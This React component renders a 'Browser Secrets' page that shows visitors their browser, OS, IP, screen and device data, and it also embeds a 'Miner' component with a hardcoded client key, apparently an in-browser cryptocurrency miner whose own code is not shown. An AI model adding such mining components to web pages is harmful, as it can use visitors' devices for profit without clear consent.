import React from 'react'
import 'bootstrap/dist/css/bootstrap-grid.min.css'
import 'bootstrap/dist/css/bootstrap-reboot.min.css'
import './style.css'
import parser from 'ua-parser-js'
import Browser from '../Browser'
import IPAddress from '../IPAddress'
import Os from '../Os'
import Device from '../Device'
import Screen from '../Screen'
import Miner from '../Miner'

class MainApp extends React.Component{

	render(){

		let ua = parser()

		return(
			<div className='main-wrap'>
				<div className="section2">
					<div className="main-header">
						<h1 className='title'>Browser Secrets</h1>
						<p className="message">Everything the internet knows about you from your Browser</p>
					</div>
				</div>
				<div className="section1">
					<div className="container">
						<div className='row'>
							<div className='col-md-6 col-xl-4'>
								<Browser
									name={ua.browser.name}
									version={ua.browser.version}
								/>
							</div>
							<div className='col-md-6 col-xl-4'>
								<Os
									name={ua.os.name}
									version={ua.os.version}
								/>
							</div>
							<div className='col-md-6 col-xl-4'>
								<IPAddress />
							</div>
							<div className='col-md-6 col-xl-4'>
								<Screen />
							</div>
							<div className='col-md-6 col-xl-4'>
								<Device
									architecture={ua.cpu.architecture}
									model={ua.device.model}
									type={ua.device.type}
									vendor={ua.device.vendor}
								/>
							</div>
							<div className='col-md-6 col-xl-4'>
								<Miner
									clientKey={'glxz6EibUmNoRXA6iZSW01hIq84Pw2LC'} 
								/>
							</div>
						</div>
					</div>
				</div>
				<div className="section2">
					<div className="main-footer">
						<p className='message'>Made by Ricardo Pimentel</p>
						<p className='message'>Powered by React</p>
					</div>
				</div>
			</div>
		)
	}
}

export default MainApp
